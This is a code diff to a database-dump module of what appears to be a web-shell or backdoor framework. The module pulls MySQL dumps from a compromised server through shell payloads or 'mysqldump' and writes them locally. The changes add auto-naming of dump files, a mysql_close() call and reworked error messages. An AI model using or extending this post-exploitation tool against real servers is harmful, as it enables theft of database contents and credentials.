@@ -95,6 +95,7 @@ while ($i < $num_rows)
     $i++;
 }
 }
+mysql_close();
 """),
    Vector('shell.sh', 'mysqldump', "mysqldump -h %s -u %s --password=%s %s %s --single-transaction") ,
     # --single-transaction to avoid bug http://bugs.mysql.com/bug.php?id=21527
@@ -109,7 +110,7 @@ while ($i < $num_rows)
             P(arg='db', help='Database name', required=True, pos=3),
             P(arg='table', help='Table name to dump (any to dump entire database)', default='any', pos=4),
             P(arg='host', help='SQL host or host:port', default='127.0.0.1', pos=5),
-            P(arg='lfile', help='Local dump path', default='sql.dump', pos=6))
+            P(arg='lfile', help='Local path (keep \'auto\' for automatic naming)', default='auto', pos=6))
 
 
     def __init__( self, modhandler , url, password):
@@ -125,6 +126,9 @@ while ($i < $num_rows)
         if mode != 'mysql':
             raise ModuleException(self.name,  "Only 'mysql' database is supported so far")
         
+        
+        uri = '%s:%s@%s-%s' % (user, pwd, host, db)
+        
         vectors = self._get_default_vector2()
         if not vectors:
             vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells + [ 'sql.query' ])
@@ -132,21 +136,32 @@ while ($i < $num_rows)
             response = self.__execute_payload(vector, [mode, host, user, pwd, db, table])
             if response != None:
                 
+                if response.startswith('-- DEFAULT'):
+                    # mysqlphpdump default fallback
+                    self.mprint("[%s] Error connecting to '%s', using default (query 'SELECT USER();' to print out)" % ( self.name, uri))
+                    uri = 'default'
+                elif 'mysqldump: Got error:' in response:
+                    # mysqldump output but error
+                    self.mprint("[%s] Error connecting to '%s', check credentials and db name" % ( self.name, uri))
+                
                 try:
+                    if lpath == 'auto':
+                        lpath = '%s.txt' % uri
+                    
+                    self.mprint("[%s] Saving '%s' dump in '%s'" % (self.name, uri, lpath))
+
                     lfile = open(lpath,'w')
                 except:
                     raise ModuleException(self.name,  "Error opening dump file \'%s\'" % lpath)
-                
-                if response.startswith('-- DEFAULT'):
-                    self.mprint("[%s] Error connecting to '%s:%s@%s', check credentials\n[%s] Default connection 'user@localhost' available, saving dump in %s\n" % ( self.name, user, pwd, host, self.name, lpath))
-                else:
-                    self.mprint("[%s] Saving '%s:%s@%s' dump in '%s'\n" % (self.name, user, pwd, host, lpath))
-                    
+                                    
                 self.params.set_and_check_parameters({'vector' : vector.name})
                 
                 lfile.write(response)
                 lfile.close()
                 return
+        
+        self.mprint('[%s] Error dumping \'%s\', check credentials, host and database name' % (self.name, uri))
+            
         
     def __execute_payload(self, vector, parameters):
         
@@ -171,8 +186,6 @@ while ($i < $num_rows)
         
         if response:
             return response
-        else:
-            self.mprint('[%s] Error dumping database. Access denied or wrong database name' % self.name)
             
     def __prepare_payload( self, vector, parameters):
 
